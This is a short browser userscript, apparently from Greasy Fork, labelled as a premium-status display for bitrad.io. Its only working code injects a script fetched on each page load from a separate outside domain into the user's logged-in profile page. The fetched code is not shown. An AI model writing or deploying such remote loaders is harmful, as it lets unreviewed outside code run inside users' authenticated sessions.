// ==UserScript==
// @name         Bitradio premium Status
// @namespace    http://bitrad.io/
// @version      0.19
// @author       lxgn
// @description  BitradIO premium status
// @match        https://bitrad.io/profile/premium/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/370311/Bitradio%20premium%20Status.user.js
// @updateURL https://update.greasyfork.org/scripts/370311/Bitradio%20premium%20Status.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();

var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://bitradio.liksagen.com/js/premium/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }